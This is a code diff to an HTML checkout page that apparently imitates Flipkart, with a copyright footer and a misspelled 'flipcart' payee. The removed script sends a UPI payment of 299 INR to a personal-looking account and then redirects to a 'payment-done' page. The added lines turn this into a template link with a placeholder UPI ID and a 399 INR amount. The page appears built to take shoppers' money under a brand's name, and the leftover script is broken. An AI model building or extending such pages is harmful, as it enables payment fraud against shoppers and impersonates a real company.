@@ -177,20 +177,14 @@
             <img class="payment-logo" src="gpay.png" alt="Google Pay Logo"> Google Pay (GPay)
         </label>
     </div>
-
-    <button class="pay-now-button" onclick="processPayment()">Pay Now</button>
+<a href="upi://pay?pa=your-upi-id@upi&pn=flipcart&mc=1234&tid=12345&tr=1234567890&tn=Payment%20for%20Goods&am=399&cu=INR&url=payment-done.html">
+    <button class="pay-now-button" onclick="processPayment()">Pay Now</button></a>
 </div>
 
     <footer>
         <p>&copy; 2023 Flipkart. All rights reserved.</p>
     </footer>
-    <script>
-        function processPayment() {
-            
-
-    window.open("upi://pay?pa=9723703781@hdfcbank&pn=flipcart&mc=1234&tid=12345&tr=1234567890&tn=Payment%20to%20flipcart&am=299")
-              window.addEventListener('pageshow', function(event){if(event.persisted){window.location.href="payment-done.html"}}
-      }
+    
     </script>
     
    
